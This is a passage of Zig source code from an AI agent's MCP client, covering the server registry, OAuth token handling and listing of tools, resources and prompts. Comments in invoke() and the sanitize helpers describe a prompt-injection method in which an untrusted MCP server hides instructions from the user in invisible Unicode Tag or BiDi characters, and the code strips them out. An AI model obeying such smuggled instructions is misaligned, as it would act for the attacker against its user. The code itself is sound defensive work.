        if (self.server_instructions.get(server_name)) |text| return text;
        return null;
    }

    pub fn list(self: *Client) ![]Server {
        self.ensureScopedConfig();
        // When scoped config is active, the merged set (legacy registry imported
        // at user scope + project `.mcp.json` + enterprise, filtered by policy /
        // approval) is the source of truth, rendered back into the flat
        // {name, transport} shape callers expect. Otherwise fall back to the raw
        // legacy registry (tests, and any run before scoped config is enabled).
        if (self.scoped_enabled and self.scoped_loaded) {
            return self.listFromScoped();
        }
        return readServers(self.allocator, self.registry_path);
    }

    /// Render the merged scoped server set as a `[]Server`. Caller frees with
    /// `freeServers`.
    fn listFromScoped(self: *Client) ![]Server {
        var out = std.array_list.Managed(Server).init(self.allocator);
        errdefer {
            for (out.items) |s| {
                self.allocator.free(s.name);
                self.allocator.free(s.transport);
            }
            out.deinit();
        }
        for (self.scoped_servers) |*cfg| {
            try out.ensureUnusedCapacity(1);
            const name = try self.allocator.dupe(u8, cfg.name);
            errdefer self.allocator.free(name);
            const transport = try transportStringForConfig(self.allocator, cfg);
            out.appendAssumeCapacity(.{ .name = name, .transport = transport });
        }
        return out.toOwnedSlice();
    }

    /// True when `server_name` already has a live session (stdio/http/websocket)
    /// in this process. Non-blocking: it only inspects the session caches and
    /// never initiates a connection. Used by the REPL slash-suggestion path so
    /// typing `/` never synchronously connects to (and blocks on) a slow MCP
    /// server. (PRD #534 follow-up: input must never block on MCP I/O.)
    ///
    /// CONCURRENCY: the session maps are not mutex-guarded, so a `contains` read
    /// here races with a background-agent thread that lazily inserts a session
    /// (getOrPut -> rehash) on the SAME shared Client. This is a pre-existing
    /// hazard (the old suggestion path read AND wrote these maps from the input
    /// loop); this reader only narrows it. A correct fix needs a lock that does
    /// NOT span the connect I/O (a coarse lock would re-freeze the input loop on
    /// a slow server) - i.e. an MCP-client concurrency redesign, tracked
    /// separately. Until then, only call when no background agent is mutating.
    pub fn isConnected(self: *Client, server_name: []const u8) bool {
        return self.stdio_sessions.contains(server_name) or
            self.http_sessions.contains(server_name) or
            self.websocket_sessions.contains(server_name);
    }

    pub fn serverTransport(self: *Client, server_name: []const u8) ![]u8 {
        return self.transportForServer(server_name);
    }

    pub fn add(self: *Client, name: []const u8, transport: []const u8) !void {
        const servers = try readServers(self.allocator, self.registry_path);
        defer freeServers(self.allocator, servers);

        for (servers) |existing| {
            if (std.mem.eql(u8, existing.name, name)) return error.ServerAlreadyExists;
        }

        var updated = std.array_list.Managed(Server).init(self.allocator);
        defer {
            for (updated.items) |s| {
                self.allocator.free(s.name);
                self.allocator.free(s.transport);
            }
            updated.deinit();
        }

        for (servers) |s| {
            try appendServerEntry(self.allocator, &updated, s.name, s.transport);
        }

        try appendServerEntry(self.allocator, &updated, name, transport);

        try writeServers(self.allocator, self.registry_path, updated.items);
    }

    pub fn remove(self: *Client, name: []const u8) !bool {
        const servers = try readServers(self.allocator, self.registry_path);
        defer freeServers(self.allocator, servers);

        var updated = std.array_list.Managed(Server).init(self.allocator);
        defer {
            for (updated.items) |s| {
                self.allocator.free(s.name);
                self.allocator.free(s.transport);
            }
            updated.deinit();
        }

        var removed = false;
        for (servers) |s| {
            if (std.mem.eql(u8, s.name, name)) {
                removed = true;
                continue;
            }
            try appendServerEntry(self.allocator, &updated, s.name, s.transport);
        }

        if (!removed) return false;
        try writeServers(self.allocator, self.registry_path, updated.items);
        self.clearHttpSession(name);
        self.clearStdioSession(name);
        self.clearWebSocketSession(name);
        return true;
    }

    pub fn testServer(self: *Client, name: []const u8) ![]u8 {
        const servers = try readServers(self.allocator, self.registry_path);
        defer freeServers(self.allocator, servers);
        const auth_token = try self.authTokenForServer(name);
        defer if (auth_token) |token| self.allocator.free(token);

        for (servers) |s| {
            if (!std.mem.eql(u8, s.name, name)) continue;

            if (isWebSocketTransport(s.transport)) {
                var info = try self.initializeWebSocketInfo(s.name, s.transport, auth_token);
                defer info.deinit(self.allocator);
                return formatServerTestResult(self.allocator, s.name, "websocket", info.protocol_version, info.server_name, info.server_version, null, auth_token, info.instructions);
            }

            if (isHttpTransport(s.transport)) {
                var info = self.initializeHttpInfo(s.name, s.transport, auth_token) catch |err| switch (err) {
                    error.InvalidResponse => {
                        _ = try self.listToolsLegacyHttp(s.transport, auth_token);
                        return std.fmt.allocPrint(self.allocator, "MCP server {s} transport reachable mode=legacy-http auth={s}", .{
                            s.name,
                            if (auth_token != null) "configured" else "none",
                        });
                    },
                    else => return err,
                };
                defer info.deinit(self.allocator);

                const session_state = if (self.getHttpSessionId(s.name) != null) "stateful" else "stateless";
                return formatServerTestResult(self.allocator, s.name, "streamable-http", info.protocol_version, info.server_name, info.server_version, session_state, auth_token, info.instructions);
            }

            var info = try self.initializeStdioInfo(s.name, s.transport, auth_token);
            defer info.deinit(self.allocator);
            return formatServerTestResult(self.allocator, s.name, "stdio", info.protocol_version, info.server_name, info.server_version, null, auth_token, info.instructions);
        }

        return error.ServerNotFound;
    }

    pub fn authLogin(self: *Client, server_name: []const u8, token: []const u8, scheme: []const u8) !void {
        return self.authLoginDetailed(server_name, token, scheme, null, null, "manual");
    }

    pub fn authLoginDetailed(
        self: *Client,
        server_name: []const u8,
        token: []const u8,
        scheme: []const u8,
        refresh_token: ?[]const u8,
        expires_ts: ?i64,
        auth_mode: []const u8,
    ) !void {
        return self.authLoginDetailedWithMetadata(server_name, token, scheme, refresh_token, expires_ts, auth_mode, null, null);
    }

    pub fn authLoginDetailedWithMetadata(
        self: *Client,
        server_name: []const u8,
        token: []const u8,
        scheme: []const u8,
        refresh_token: ?[]const u8,
        expires_ts: ?i64,
        auth_mode: []const u8,
        client_id: ?[]const u8,
        token_endpoint: ?[]const u8,
    ) !void {
        const auth_path = try self.authStorePath();
        defer self.allocator.free(auth_path);

        const existing = try readAuthEntries(self.allocator, auth_path);
        defer freeAuthEntries(self.allocator, existing);

        var updated = std.array_list.Managed(AuthEntry).init(self.allocator);
        defer {
            for (updated.items) |entry| {
                self.allocator.free(entry.server);
                self.allocator.free(entry.scheme);
                self.allocator.free(entry.token);
                if (entry.refresh_token) |value| self.allocator.free(value);
                self.allocator.free(entry.auth_mode);
                if (entry.client_id) |value| self.allocator.free(value);
                if (entry.token_endpoint) |value| self.allocator.free(value);
            }
            updated.deinit();
        }

        var replaced = false;
        for (existing) |entry| {
            if (std.mem.eql(u8, entry.server, server_name)) {
                replaced = true;
                try updated.ensureUnusedCapacity(1);
                const cloned = try cloneAuthEntry(
                    self.allocator,
                    server_name,
                    scheme,
                    token,
                    clock.nowSeconds(),
                    refresh_token,
                    expires_ts,
                    auth_mode,
                    client_id,
                    token_endpoint,
                );
                updated.appendAssumeCapacity(cloned);
                continue;
            }
            try updated.ensureUnusedCapacity(1);
            const cloned = try cloneAuthEntry(
                self.allocator,
                entry.server,
                entry.scheme,
                entry.token,
                entry.updated_ts,
                entry.refresh_token,
                entry.expires_ts,
                entry.auth_mode,
                entry.client_id,
                entry.token_endpoint,
            );
            updated.appendAssumeCapacity(cloned);
        }

        if (!replaced) {
            try updated.ensureUnusedCapacity(1);
            const cloned = try cloneAuthEntry(
                self.allocator,
                server_name,
                scheme,
                token,
                clock.nowSeconds(),
                refresh_token,
                expires_ts,
                auth_mode,
                client_id,
                token_endpoint,
            );
            updated.appendAssumeCapacity(cloned);
        }

        try writeAuthEntries(self.allocator, auth_path, updated.items);
    }

    pub fn authLogout(self: *Client, server_name: []const u8) !bool {
        const auth_path = try self.authStorePath();
        defer self.allocator.free(auth_path);

        const existing = try readAuthEntries(self.allocator, auth_path);
        defer freeAuthEntries(self.allocator, existing);

        var updated = std.array_list.Managed(AuthEntry).init(self.allocator);
        defer {
            for (updated.items) |entry| {
                self.allocator.free(entry.server);
                self.allocator.free(entry.scheme);
                self.allocator.free(entry.token);
                if (entry.refresh_token) |value| self.allocator.free(value);
                self.allocator.free(entry.auth_mode);
                if (entry.client_id) |value| self.allocator.free(value);
                if (entry.token_endpoint) |value| self.allocator.free(value);
            }
            updated.deinit();
        }

        var removed = false;
        for (existing) |entry| {
            if (std.mem.eql(u8, entry.server, server_name)) {
                removed = true;
                continue;
            }
            try updated.ensureUnusedCapacity(1);
            const cloned = try cloneAuthEntry(
                self.allocator,
                entry.server,
                entry.scheme,
                entry.token,
                entry.updated_ts,
                entry.refresh_token,
                entry.expires_ts,
                entry.auth_mode,
                entry.client_id,
                entry.token_endpoint,
            );
            updated.appendAssumeCapacity(cloned);
        }

        if (!removed) return false;
        try writeAuthEntries(self.allocator, auth_path, updated.items);
        return true;
    }

    pub fn authStatus(self: *Client, maybe_server_name: ?[]const u8) ![]AuthStatus {
        const auth_path = try self.authStorePath();
        defer self.allocator.free(auth_path);

        const entries = try readAuthEntries(self.allocator, auth_path);
        defer freeAuthEntries(self.allocator, entries);

        var out = std.array_list.Managed(AuthStatus).init(self.allocator);
        defer {
            for (out.items) |entry| {
                self.allocator.free(entry.server);
                self.allocator.free(entry.scheme);
                self.allocator.free(entry.masked_token);
                self.allocator.free(entry.auth_mode);
            }
            out.deinit();
        }

        for (entries) |entry| {
            if (maybe_server_name) |server_name| {
                if (!std.mem.eql(u8, entry.server, server_name)) continue;
            }
            try out.ensureUnusedCapacity(1);
            const dup_server = try self.allocator.dupe(u8, entry.server);
            errdefer self.allocator.free(dup_server);
            const dup_scheme = try self.allocator.dupe(u8, entry.scheme);
            errdefer self.allocator.free(dup_scheme);
            const masked = try maskToken(self.allocator, entry.token);
            errdefer self.allocator.free(masked);
            const dup_auth_mode = try self.allocator.dupe(u8, entry.auth_mode);
            out.appendAssumeCapacity(.{
                .server = dup_server,
                .scheme = dup_scheme,
                .masked_token = masked,
                .updated_ts = entry.updated_ts,
                .refreshable = entry.refresh_token != null,
                .expires_ts = entry.expires_ts,
                .auth_mode = dup_auth_mode,
            });
        }

        return out.toOwnedSlice();
    }

    pub fn pushBridge(self: *Client, bridge: ClientBridge) !void {
        try self.bridge_stack.append(bridge);
    }

    pub fn popBridge(self: *Client, ctx: *anyopaque) void {
        var idx = self.bridge_stack.items.len;
        while (idx > 0) {
            idx -= 1;
            if (self.bridge_stack.items[idx].ctx == ctx) {
                _ = self.bridge_stack.swapRemove(idx);
                return;
            }
        }
    }

    pub fn listNotifications(self: *Client, maybe_server_name: ?[]const u8) ![]NotificationEvent {
        return self.cloneNotifications(maybe_server_name);
    }

    pub fn takeNotifications(self: *Client, maybe_server_name: ?[]const u8) ![]NotificationEvent {
        var out = std.array_list.Managed(NotificationEvent).init(self.allocator);
        errdefer {
            for (out.items) |event| {
                self.allocator.free(event.server);
                self.allocator.free(event.method);
                self.allocator.free(event.params_json);
            }
            out.deinit();
        }

        var i: usize = 0;
        while (i < self.notifications.items.len) {
            const event = self.notifications.items[i];
            if (maybe_server_name) |server_name| {
                if (!std.mem.eql(u8, event.server, server_name)) {
                    i += 1;
                    continue;
                }
            }

            try out.append(.{
                .server = event.server,
                .method = event.method,
                .params_json = event.params_json,
                .timestamp = event.timestamp,
            });
            _ = self.notifications.orderedRemove(i);
        }

        return out.toOwnedSlice();
    }

    pub fn flushNotifications(self: *Client, server_name: []const u8) !void {
        const response = self.rpcRequestForServer(server_name, "ping", "{}") catch |err| switch (err) {
            error.McpResponseTimeout, error.ConnectionClosed, error.EndOfStream => return,
            else => return err,
        };
        self.allocator.free(response);
    }

    pub fn invoke(self: *Client, server_name: []const u8, tool_name: []const u8, payload: []const u8) ![]u8 {
        const params = try buildToolCallParams(self.allocator, tool_name, payload);
        defer self.allocator.free(params);
        const raw = self.rpcRequestForServer(server_name, "tools/call", params) catch |err| {
            // ESC / Ctrl+C surfaces as error.UserCancelled from the
            // MCP poll loop. Propagate it instead of swallowing it into
            // a "MCP invoke failed" tool output -- the agent runtime
            // treats an error return as a signal to abort the turn,
            // whereas a successful string output would be fed back to
            // the model as if the MCP server had responded "cancelled".
            if (err == error.UserCancelled) return err;
            const transport = try self.transportForServer(server_name);
            defer self.allocator.free(transport);
            if (isHttpTransport(transport) and (err == error.UnsupportedMcpTransport or err == error.InvalidResponse)) {
                const auth_token = try self.authTokenForServer(server_name);
                defer if (auth_token) |token| self.allocator.free(token);
                return self.invokeLegacyHttp(transport, tool_name, payload, auth_token) catch |legacy_err| {
                    if (legacy_err == error.UserCancelled) return legacy_err;
                    return std.fmt.allocPrint(self.allocator, "MCP HTTP invoke failed: {s}", .{@errorName(legacy_err)});
                };
            }
            return std.fmt.allocPrint(self.allocator, "MCP invoke failed for server {s}: {s}", .{ server_name, @errorName(err) });
        };
        defer self.allocator.free(raw);
        // Resolve the blob spill dir best-effort. A failure to resolve it just
        // means binary blobs fall back to inline markers (the transform
        // degrades gracefully on a null spill dir) - it never aborts the tool
        // result.
        const spill_dir = @import("../core/mcp_blob_spill.zig").defaultSpillDir(self.allocator) catch null;
        defer if (spill_dir) |d| self.allocator.free(d);
        const extracted = try parsers.extractToolCallResultTextCtx(self.allocator, raw, .{
            .server_name = server_name,
            .spill_dir = spill_dir,
        });
        // Strip hidden/dangerous Unicode codepoints (Tag characters,
        // BiDi overrides, zero-width spaces, PUA chars) from MCP tool
        // output before it reaches the model. Matches the mitigation
        // behind HackerOne #3086545: an attacker-controlled MCP
        // server could otherwise smuggle invisible instructions via
        // Unicode Tag chars that the user can't see but the model
        // processes. Ported from claude-code-main/src/utils/
        // sanitization.ts partiallySanitizeUnicode.
        defer self.allocator.free(extracted);
        return unicode_sanitize.stripDangerousUnicode(self.allocator, extracted);
    }

    pub fn listTools(self: *Client, server_name: []const u8) ![]ToolInfo {
        var all = std.array_list.Managed(ToolInfo).init(self.allocator);
        errdefer {
            for (all.items) |tool| {
                self.allocator.free(tool.name);
                self.allocator.free(tool.description);
                self.allocator.free(tool.input_schema);
            }
            all.deinit();
        }

        var cursor: ?[]u8 = null;
        defer if (cursor) |value| self.allocator.free(value);

        while (true) {
            const params = try buildCursorParams(self.allocator, cursor);
            defer self.allocator.free(params);
            const raw = self.rpcRequestForServer(server_name, "tools/list", params) catch |err| {
                const transport = try self.transportForServer(server_name);
                defer self.allocator.free(transport);
                if (isHttpTransport(transport) and (err == error.UnsupportedMcpTransport or err == error.InvalidResponse)) {
                    const auth_token = try self.authTokenForServer(server_name);
                    defer if (auth_token) |token| self.allocator.free(token);
                    return self.listToolsLegacyHttp(transport, auth_token);
                }
                return err;
            };
            defer self.allocator.free(raw);

            const page = try parseToolsResponse(self.allocator, raw);
            defer self.allocator.free(page);
            for (page) |tool| {
                const safe = try sanitizeMcpToolInfo(self.allocator, tool);
                try all.append(safe);
            }

            const next_cursor = try parseNextCursorAlloc(self.allocator, raw);
            if (cursor) |value| self.allocator.free(value);
            cursor = next_cursor;
            if (cursor == null) break;
        }

        return all.toOwnedSlice();
    }

    /// Sanitize every string field of a ToolInfo before it enters
    /// the agent's view. MCP servers are untrusted by default --
    /// an attacker who controls a server can return a tool named
    /// or described with hidden Unicode Tag characters, BiDi
    /// overrides, or Private Use Area codepoints that smuggle
    /// prompt-injection instructions invisible to the user but
    /// processed by the model. This is the same HackerOne #3086545
    /// threat model that `invoke()` already mitigates for tool
    /// RESULT text; listTools() is the second entry point where
    /// untrusted strings land directly in the system prompt (via
    /// `collectSchemas` which embeds tool names and descriptions
    /// into the tool-registry schema block).
    ///
    /// The sanitizer takes ownership of the input strings and
    /// frees them after building the replacement; on success the
    /// returned ToolInfo owns fresh allocations suitable for the
    /// caller's list. On failure the original strings are freed
    /// via errdefer in the helper so no leak can occur.
    fn sanitizeMcpToolInfo(allocator: std.mem.Allocator, tool: ToolInfo) !ToolInfo {
        var safe = tool;
        const unicode = @import("../core/unicode_sanitize.zig");
        const mcp_output_limits = @import("../core/mcp_output_limits.zig");

        const safe_name = try unicode.stripDangerousUnicode(allocator, tool.name);
        errdefer allocator.free(safe_name);
        allocator.free(tool.name);
        safe.name = safe_name;

        // Sanitize, then cap the description to the MCP advertise limit (PRD
        // #534 P5) so an oversized server description can't bloat the prompt.
        const safe_desc = try unicode.stripDangerousUnicode(allocator, tool.description);
        allocator.free(tool.description);
        const capped_desc = mcp_output_limits.truncateDescription(allocator, safe_desc) catch |e| {
            allocator.free(safe_desc);
            return e;
        };
        allocator.free(safe_desc);
        errdefer allocator.free(capped_desc);
        safe.description = capped_desc;

        const safe_schema = try unicode.stripDangerousUnicode(allocator, tool.input_schema);
        errdefer allocator.free(safe_schema);
        allocator.free(tool.input_schema);
        safe.input_schema = safe_schema;

        return safe;
    }

    pub fn listResources(self: *Client, server_name: []const u8) ![]ResourceInfo {
        var all = std.array_list.Managed(ResourceInfo).init(self.allocator);
        errdefer {
            for (all.items) |resource| {
                self.allocator.free(resource.uri);
                self.allocator.free(resource.name);
                self.allocator.free(resource.description);
                self.allocator.free(resource.mime_type);
            }
            all.deinit();
        }

        var cursor: ?[]u8 = null;
        defer if (cursor) |value| self.allocator.free(value);

        while (true) {
            const params = try buildCursorParams(self.allocator, cursor);
            defer self.allocator.free(params);
            const raw = try self.rpcRequestForServer(server_name, "resources/list", params);
            defer self.allocator.free(raw);

            const page = try parseResourcesResponse(self.allocator, raw);
            defer self.allocator.free(page);
            for (page) |resource| {
                const safe = try sanitizeMcpResourceInfo(self.allocator, resource);
                try all.append(safe);
            }

            const next_cursor = try parseNextCursorAlloc(self.allocator, raw);
            if (cursor) |value| self.allocator.free(value);
            cursor = next_cursor;
            if (cursor == null) break;
        }

        return all.toOwnedSlice();
    }

    fn sanitizeMcpResourceInfo(allocator: std.mem.Allocator, resource: ResourceInfo) !ResourceInfo {
        var safe = resource;
        const unicode = @import("../core/unicode_sanitize.zig");

        // URI stays raw because URI parsers reject control
        // characters natively and a sanitized URI would silently
        // redirect to a different resource. The NAME, DESCRIPTION,
        // and MIME_TYPE are all free-form strings an attacker
        // server can use for smuggling.
        const safe_name = try unicode.stripDangerousUnicode(allocator, resource.name);
        errdefer allocator.free(safe_name);
        allocator.free(resource.name);
        safe.name = safe_name;

        const safe_desc = try unicode.stripDangerousUnicode(allocator, resource.description);
        errdefer allocator.free(safe_desc);
        allocator.free(resource.description);
        safe.description = safe_desc;

        const safe_mime = try unicode.stripDangerousUnicode(allocator, resource.mime_type);
        errdefer allocator.free(safe_mime);
        allocator.free(resource.mime_type);
        safe.mime_type = safe_mime;

        return safe;
    }

    pub fn readResource(self: *Client, server_name: []const u8, uri: []const u8) ![]ResourceContent {
        const params = try encodeJsonAlloc(self.allocator, .{ .uri = uri });
        defer self.allocator.free(params);
        const raw = try self.rpcRequestForServer(server_name, "resources/read", params);
        defer self.allocator.free(raw);
        return parseResourceReadResponse(self.allocator, raw);
    }

    pub fn listResourceTemplates(self: *Client, server_name: []const u8) ![]ResourceTemplateInfo {
        var all = std.array_list.Managed(ResourceTemplateInfo).init(self.allocator);
        errdefer {
            for (all.items) |template| {
                self.allocator.free(template.uri_template);
                self.allocator.free(template.name);
                self.allocator.free(template.description);
                self.allocator.free(template.mime_type);
            }
            all.deinit();
        }

        var cursor: ?[]u8 = null;
        defer if (cursor) |value| self.allocator.free(value);

        while (true) {
            const params = try buildCursorParams(self.allocator, cursor);
            defer self.allocator.free(params);
            const raw = try self.rpcRequestForServer(server_name, "resources/templates/list", params);
            defer self.allocator.free(raw);

            const page = try parseResourceTemplatesResponse(self.allocator, raw);
            defer self.allocator.free(page);
            for (page) |template| {
                const safe = try sanitizeMcpResourceTemplate(self.allocator, template);
                try all.append(safe);
            }

            const next_cursor = try parseNextCursorAlloc(self.allocator, raw);
            if (cursor) |value| self.allocator.free(value);
            cursor = next_cursor;
            if (cursor == null) break;
        }

        return all.toOwnedSlice();
    }

    fn sanitizeMcpResourceTemplate(allocator: std.mem.Allocator, template: ResourceTemplateInfo) !ResourceTemplateInfo {
        var safe = template;
        const unicode = @import("../core/unicode_sanitize.zig");
        // uri_template is structural -- leave it alone.
        const safe_name = try unicode.stripDangerousUnicode(allocator, template.name);
        errdefer allocator.free(safe_name);
        allocator.free(template.name);
        safe.name = safe_name;
        const safe_desc = try unicode.stripDangerousUnicode(allocator, template.description);
        errdefer allocator.free(safe_desc);
        allocator.free(template.description);
        safe.description = safe_desc;
        const safe_mime = try unicode.stripDangerousUnicode(allocator, template.mime_type);
        errdefer allocator.free(safe_mime);
        allocator.free(template.mime_type);
        safe.mime_type = safe_mime;
        return safe;
    }

    pub fn subscribeResource(self: *Client, server_name: []const u8, uri: []const u8) !void {
        const params = try encodeJsonAlloc(self.allocator, .{ .uri = uri });
        defer self.allocator.free(params);
        const transport = try self.transportForServer(server_name);
        defer self.allocator.free(transport);
        const auth_token = try self.authTokenForServer(server_name);
        defer if (auth_token) |token| self.allocator.free(token);
        if (isWebSocketTransport(transport)) {
            _ = try self.ensureWebSocketSession(server_name, transport, auth_token);
        } else if (!isHttpTransport(transport)) {
            _ = try self.ensureStdioSession(server_name, transport, auth_token);
        }
        const raw = try self.rpcRequestForServer(server_name, "resources/subscribe", params);
        self.allocator.free(raw);
    }

    pub fn unsubscribeResource(self: *Client, server_name: []const u8, uri: []const u8) !void {
        const params = try encodeJsonAlloc(self.allocator, .{ .uri = uri });
        defer self.allocator.free(params);
        const raw = try self.rpcRequestForServer(server_name, "resources/unsubscribe", params);
        self.allocator.free(raw);
    }

    pub fn listPrompts(self: *Client, server_name: []const u8) ![]PromptInfo {
        var all = std.array_list.Managed(PromptInfo).init(self.allocator);
        errdefer {
            for (all.items) |prompt| {
                self.allocator.free(prompt.name);
                self.allocator.free(prompt.description);
                for (prompt.arguments) |arg| {
                    self.allocator.free(arg.name);
                    self.allocator.free(arg.description);
                }
                self.allocator.free(prompt.arguments);
            }
            all.deinit();
        }

        var cursor: ?[]u8 = null;
        defer if (cursor) |value| self.allocator.free(value);

        while (true) {
            const params = try buildCursorParams(self.allocator, cursor);
            defer self.allocator.free(params);
            const raw = try self.rpcRequestForServer(server_name, "prompts/list", params);
            defer self.allocator.free(raw);

            const page = try parsePromptsResponse(self.allocator, raw);
            defer self.allocator.free(page);
            for (page) |prompt| {
                const safe = try sanitizeMcpPromptInfo(self.allocator, prompt);
                try all.append(safe);
            }

            const next_cursor = try parseNextCursorAlloc(self.allocator, raw);
            if (cursor) |value| self.allocator.free(value);
            cursor = next_cursor;
            if (cursor == null) break;
        }

        return all.toOwnedSlice();
    }

    fn sanitizeMcpPromptInfo(allocator: std.mem.Allocator, prompt: PromptInfo) !PromptInfo {
        var safe = prompt;
        const unicode = @import("../core/unicode_sanitize.zig");

        const safe_name = try unicode.stripDangerousUnicode(allocator, prompt.name);
        errdefer allocator.free(safe_name);
        allocator.free(prompt.name);
        safe.name = safe_name;

        const safe_desc = try unicode.stripDangerousUnicode(allocator, prompt.description);
        errdefer allocator.free(safe_desc);
        allocator.free(prompt.description);
        safe.description = safe_desc;

        // Prompt arguments are also attacker-controlled on an
        // untrusted server: an argument named `question_\u{E0020}...`
        // would smuggle the same payload. Sanitize in place.
        for (safe.arguments) |*arg| {
            const safe_arg_name = try unicode.stripDangerousUnicode(allocator, arg.name);
            errdefer allocator.free(safe_arg_name);
            allocator.free(arg.name);
            arg.name = safe_arg_name;

            const safe_arg_desc = try unicode.stripDangerousUnicode(allocator, arg.description);
            errdefer allocator.free(safe_arg_desc);
            allocator.free(arg.description);
            arg.description = safe_arg_desc;
        }

        return safe;
    }

    pub fn getPrompt(self: *Client, server_name: []const u8, prompt_name: []const u8, arguments_json: ?[]const u8) !PromptResult {
        const params = try buildPromptGetParams(self.allocator, prompt_name, arguments_json);
        defer self.allocator.free(params);

        const raw = try self.rpcRequestForServer(server_name, "prompts/get", params);
        defer self.allocator.free(raw);
        return parsePromptResponse(self.allocator, raw);
    }

    pub fn complete(self: *Client, server_name: []const u8, ref_json: []const u8, argument_name: []const u8, value: ?[]const u8) !CompletionResult {
        const params = try buildCompletionParams(self.allocator, ref_json, argument_name, value);
        defer self.allocator.free(params);
        const raw = try self.rpcRequestForServer(server_name, "completion/complete", params);
        defer self.allocator.free(raw);
        return parseCompletionResponse(self.allocator, raw);
    }

    pub fn setLoggingLevel(self: *Client, server_name: []const u8, level: []const u8) !void {
        const params = try encodeJsonAlloc(self.allocator, .{ .level = level });
        defer self.allocator.free(params);
        const raw = try self.rpcRequestForServer(server_name, "logging/setLevel", params);
        self.allocator.free(raw);
    }

    fn authStorePath(self: *Client) ![]u8 {
        const parent = std.fs.path.dirname(self.registry_path) orelse return error.InvalidPath;
        return std.fs.path.join(self.allocator, &.{ parent, "auth.json" });
    }

    fn authTokenForServer(self: *Client, server_name: []const u8) !?[]u8 {
        const auth_path = try self.authStorePath();
        defer self.allocator.free(auth_path);

        const entries = try readAuthEntries(self.allocator, auth_path);
        defer freeAuthEntries(self.allocator, entries);

        for (entries) |entry| {
            if (!std.mem.eql(u8, entry.server, server_name)) continue;
            if (shouldRefreshToken(entry)) {
                if (entry.refresh_token) |refresh_token| {
                    if (entry.client_id) |client_id| {
                        if (entry.token_endpoint) |token_endpoint| {
                            var refreshed = try mcp_oauth.refreshAccessToken(self.allocator, refresh_token, client_id, token_endpoint);
                            defer refreshed.deinit(self.allocator);

                            // At this point we have just-rotated credentials.
                            // If the persist step below fails (disk full,
                            // permission error, crash), we would previously
                            // propagate the error and throw away a perfectly
                            // valid access_token that the caller could use
                            // for THIS request. Worse: the next launch would
                            // re-read the stale auth.json, find the already-
                            // revoked old refresh_token (OAuth servers rotate
                            // refresh tokens), and lock the user out until
                            // they /mcp login again. Log the persist error
                            // loudly and continue with the fresh token so the
                            // current request succeeds. The user sees a
                            // warning and can re-auth at their leisure.
                            self.authLoginDetailedWithMetadata(
                                server_name,
                                refreshed.access_token,
                                entry.scheme,
                                refreshed.refresh_token orelse refresh_token,
                                refreshed.expires_ts,
                                entry.auth_mode,
                                client_id,
                                token_endpoint,
                            ) catch |err| {
                                std.log.warn(
                                    "mcp[{s}]: refreshed OAuth tokens but failed to persist ({s}); request will succeed, but next launch may require /mcp login",
                                    .{ server_name, @errorName(err) },
                                );
                            };
                            return try self.allocator.dupe(u8, refreshed.access_token);
                        }
                    }
                }
            }
            return try self.allocator.dupe(u8, entry.token);
        }
        return null;
    }

    fn nextRpcId(self: *Client) i64 {
        const id = self.next_request_id;
        self.next_request_id += 1;
        return id;
    }

    fn transportForServer(self: *Client, server_name: []const u8) ![]u8 {
        const servers = try readServers(self.allocator, self.registry_path);
        defer freeServers(self.allocator, servers);

        for (servers) |server| {
            if (std.mem.eql(u8, server.name, server_name)) {
                return try self.allocator.dupe(u8, server.transport);
            }
        }
        return error.ServerNotFound;
    }

    fn rpcRequestForServer(self: *Client, server_name: []const u8, method: []const u8, params_json: []const u8) ![]u8 {
        const auth_token = try self.authTokenForServer(server_name);
        defer if (auth_token) |token| self.allocator.free(token);

        // Structured scoped config drives the connection when present: a server
        // declared in a `.mcp.json` (or imported from the legacy registry into
        // the merged set) connects with its structured command/args/env (stdio)
        // or url/headers/headersHelper (http). `serverConfigFor` lazily loads the
        // merged set on first use (real runs only; tests opt in explicitly).
        if (self.serverConfigFor(server_name)) |cfg| {
            switch (cfg.type) {
                .ws => {
                    const transport = cfg.url orelse return error.ServerNotFound;
                    if (self.websocket_sessions.contains(server_name)) {
                        return self.rpcWebSocketPersistent(server_name, transport, method, params_json, auth_token);
                    }
                    return self.rpcWebSocket(server_name, transport, method, params_json, auth_token);
                },
                .http, .sse => {
                    const transport = cfg.url orelse return error.ServerNotFound;
                    return self.rpcHttpStructured(cfg, server_name, transport, method, params_json, auth_token);
                },
                .stdio, .sdk => {
                    // Persistent structured stdio: spawn `command ++ args` with
                    // parent env + per-server env (no `zsh -lc` wrapper).
                    return self.rpcStdioPersistentStructured(cfg, server_name, method, params_json, auth_token);
                },
            }
        }

        // Legacy fallback: the flat `{name, transport}` registry path.
        const servers = try readServers(self.allocator, self.registry_path);
        defer freeServers(self.allocator, servers);

        for (servers) |server| {
            if (!std.mem.eql(u8, server.name, server_name)) continue;

            if (isWebSocketTransport(server.transport)) {
                if (self.websocket_sessions.contains(server_name)) {
                    return self.rpcWebSocketPersistent(server_name, server.transport, method, params_json, auth_token);
                }
                return self.rpcWebSocket(server_name, server.transport, method, params_json, auth_token);
            }
            if (isHttpTransport(server.transport)) {
                return self.rpcHttp(server.name, server.transport, method, params_json, auth_token);
            }
            // Always use persistent sessions for stdio transports to avoid
            // re-establishing SSH connections on every MCP call.
            return self.rpcStdioPersistent(server_name, server.transport, method, params_json, auth_token);
        }
        return error.ServerNotFound;
    }

    fn invokeLegacyHttp(self: *Client, transport: []const u8, tool_name: []const u8, payload: []const u8, auth_token: ?[]const u8) ![]u8 {
        const endpoint = try std.fmt.allocPrint(self.allocator, "{s}/invoke", .{transport});
        defer self.allocator.free(endpoint);

        const body = try encodeJsonAlloc(self.allocator, .{
            .tool = tool_name,
            .payload = payload,
        });
        defer self.allocator.free(body);

        const headers = try authHeaders(self.allocator, auth_token);
        defer freeOwnedStrings(self.allocator, headers);
        const raw = try http_common.callHttpJson(self.allocator, endpoint, headers, body, connectionTimeoutMs());
        defer self.allocator.free(raw);
        return extractToolCallResultText(self.allocator, raw);
    }

    fn listToolsLegacyHttp(self: *Client, transport: []const u8, auth_token: ?[]const u8) ![]ToolInfo {
        const endpoint = try std.fmt.allocPrint(self.allocator, "{s}/tools/list", .{transport});
        defer self.allocator.free(endpoint);

        const headers = try authHeaders(self.allocator, auth_token);
        defer freeOwnedStrings(self.allocator, headers);
        const raw = try http_common.callHttpJson(self.allocator, endpoint, headers, "{}", connectionTimeoutMs());
        defer self.allocator.free(raw);
        return parseToolsResponse(self.allocator, raw);
    }

    fn rpcStdio(self: *Client, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        var session = try self.initializeFreshStdioSession(server_name, transport, auth_token);
        defer session.deinit();

        const request_id = self.nextRpcId();
